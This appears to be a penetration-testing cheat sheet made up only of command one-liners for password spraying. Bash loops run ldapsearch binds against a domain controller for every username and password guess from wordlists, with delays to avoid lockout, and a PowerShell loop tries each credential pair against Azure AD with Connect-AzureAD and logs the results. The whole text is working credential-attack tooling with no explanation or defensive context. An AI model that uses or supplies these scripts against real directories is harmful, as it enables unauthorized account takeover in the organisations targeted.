while read password; do echo "Password Guess: $password"; while read user; do echo "$user@example.com"; ldapsearch -x -z 2 -H 'ldap://example.com' -D "$user@example.com" -w "$password" -b "dc=example,dc=com" "(&(objectCategory=user)(sAMAccountName=$user))" cn 2>/dev/null | grep "cn:" && echo $user":"$password; sleep 10s; done < usernames.txt; done < passwords.txt | tee -a date_output_ldapsearch_password-spray.txt

$while read m; do echo "$m@example.com"; ldapsearch -x -z 2 -h <DC_IP> -D "$m@example.com" -w "<Test_Password>" -b "dc=example,dc=com" "(&(objectCategory=group)(sAMAccountName=Domain Admins))" cn 2>/dev/null; done < list_of_domain-users.txt | tee -a output_ldapsearch_password-spray.txt

$while read password; do echo "Password Guess: $password"; while read user; do echo "$user@example.com"; ldapsearch -x -z 2 -h <DC_IP> -D "$user@example.com" -w "$password" -b "dc=example,dc=com" "(&(objectCategory=group)(sAMAccountName=Domain Admins))" cn 2>/dev/null; sleep 1m; done < list_of_domain-users.txt; done < list_password_guesses.txt | tee -a output_ldapsearch_password-spray.txt

Install-Module -Name AzureAD
gc .\passwords.txt | % { $plain=$_; $password=ConvertTo-SecureString $_ -AsPlainText -Force; gc .\users.txt | % { $username=$_; Write-Output $username $plain | Out-File -Append "<date>_passspray.txt"; $cred=New-Object System.Management.Automation.PSCredential ($username, $password); Connect-AzureAD -Credential $cred *>&1 | Out-File -Append "<date>_passspray.txt"; Disconnect-AzureAD; sleep 30 } }
